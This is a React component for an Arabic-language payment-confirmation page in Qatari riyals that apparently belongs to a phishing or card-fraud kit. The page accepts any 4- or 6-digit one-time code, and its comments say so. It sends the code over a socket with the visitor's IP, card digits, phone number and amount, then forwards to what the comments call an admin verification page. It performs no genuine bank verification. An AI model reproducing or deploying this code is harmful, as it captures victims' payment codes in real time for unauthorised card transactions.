import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function PaymentOTP() {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket } = useSocket();
  
  // البيانات القادمة من صفحة الانتظار
  const { cardLastDigits, phoneNumber, amount } = location.state || {};
  
  const [otpCode, setOtpCode] = useState('');
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState('');
  const [canResend, setCanResend] = useState(false);

  // عداد تنازلي
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // تنسيق الوقت
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // التعامل مع إدخال OTP
  const handleOtpChange = (e) => {
    const value = e.target.value;
    // السماح بالأرقام فقط وحد أقصى 6 أرقام
    if (!/^\d*$/.test(value) || value.length > 6) return;
    
    setOtpCode(value);
    setError('');
  };

  // إعادة إرسال الرمز
  const handleResendOtp = () => {
    if (!canResend) return;
    
    setTimeLeft(120);
    setCanResend(false);
    setOtpCode('');
    setError('');
    
    if (socket) {
      socket.emit('resendOTP', { phoneNumber });
    }
    
    // رسالة نجاح
    alert('تم إرسال رمز التحقق الجديد');
  };

  // التحقق من الرمز
  const handleVerifyOtp = async () => {
    // يجب أن يكون 4 أو 6 أرقام فقط
    if (otpCode.length !== 4 && otpCode.length !== 6) {
      setError('يرجى إدخال رمز مكون من 4 أو 6 أرقام فقط');
      return;
    }

    setIsVerifying(true);
    setError('');

    // قبول أي رمز OTP مكون من 4 أو 6 أرقام
    setTimeout(() => {
      // إرسال OTP للباكند
      if (socket) {
        socket.emit('submitOTP', {
          ip: sessionStorage.getItem('userIP') || 'unknown',
          otpCode,
          cardLastDigits,
          phoneNumber,
          amount,
          timestamp: new Date().toISOString()
        });
      }

      // الذهاب لصفحة التحقق من الأدمن (قبول أي رقم)
      navigate('/otp-verification', {
        state: {
          otpCode,
          cardLastDigits,
          phoneNumber,
          amount
        }
      });
      
      setIsVerifying(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        {/* الأيقونة */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center">
            <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
        </div>

        {/* العنوان */}
        <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
          تأكيد عملية الدفع
        </h1>
        <p className="text-center text-gray-600 mb-6">
          أدخل رمز التحقق (4 أو 6 أرقام)
        </p>

        {/* معلومات البطاقة والهاتف */}
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm">
          <div className="flex items-center justify-between mb-2">
            <span className="text-gray-600">البطاقة:</span>
            <span className="font-semibold text-gray-800 font-mono" dir="ltr">
              **** **** **** {cardLastDigits || '****'}
            </span>
          </div>
          <div className="flex items-center justify-between mb-2">
            <span className="text-gray-600">الهاتف:</span>
            <span className="font-semibold text-gray-800 font-mono" dir="ltr">{phoneNumber || '+974 ****'}</span>
          </div>
          {amount && (
            <div className="flex items-center justify-between pt-2 border-t border-gray-200">
              <span className="text-gray-600">المبلغ:</span>
              <span className="font-bold text-blue-600 text-lg" dir="ltr">QAR {amount}</span>
            </div>
          )}
        </div>

        {/* حقول إدخال OTP */}
        <div className="mb-6">
          <label htmlFor="otp-input" className="block text-sm font-semibold text-gray-700 mb-2 text-center">
            رمز التحقق (4 أو 6 أرقام)
          </label>
          <input
            id="otp-input"
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={otpCode}
            onChange={handleOtpChange}
            placeholder="أدخل الرمز"
            className={`w-full h-16 text-center text-3xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all tracking-widest ${
              error ? 'border-red-500' : 'border-gray-300'
            }`}
            dir="ltr"
            autoComplete="off"
          />
          <p className="text-center text-xs text-gray-500 mt-2">
            {otpCode.length} / 6 أرقام
          </p>

          {/* رسالة الخطأ */}
          {error && (
            <div className="flex items-center gap-2 text-red-600 text-sm mb-4 bg-red-50 p-3 rounded-lg">
              <svg className="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span dir="rtl">{error}</span>
            </div>
          )}
        </div>

        {/* العداد التنازلي */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <div className="flex items-center justify-between text-sm">
            <span className="text-gray-700">ينتهي الرمز خلال:</span>
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span className="font-bold text-blue-600 text-lg">{formatTime(timeLeft)}</span>
            </div>
          </div>
          <div className="w-full bg-blue-200 rounded-full h-1.5 mt-3">
            <div 
              className="bg-blue-600 h-1.5 rounded-full transition-all duration-1000"
              style={{ width: `${(timeLeft / 120) * 100}%` }}
            ></div>
          </div>
        </div>

        {/* زر التحقق */}
        <button
          onClick={handleVerifyOtp}
          disabled={isVerifying || (otpCode.length !== 4 && otpCode.length !== 6)}
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors mb-4"
        >
          {isVerifying ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              جاري التحقق...
            </span>
          ) : (
            'تأكيد الرمز'
          )}
        </button>

        {/* إعادة إرسال الرمز */}
        <div className="text-center">
          {canResend ? (
            <button
              onClick={handleResendOtp}
              className="text-blue-600 font-semibold hover:text-blue-700 transition-colors"
            >
              إعادة إرسال الرمز
            </button>
          ) : (
            <p className="text-gray-500 text-sm">
              لم تستلم الرمز؟ يمكنك إعادة الإرسال بعد انتهاء الوقت
            </p>
          )}
        </div>

        {/* زر الإلغاء */}
        <button
          onClick={() => navigate('/payment-failed')}
          className="w-full mt-4 bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
        >
          إلغاء العملية
        </button>
      </div>
    </div>
  );
}
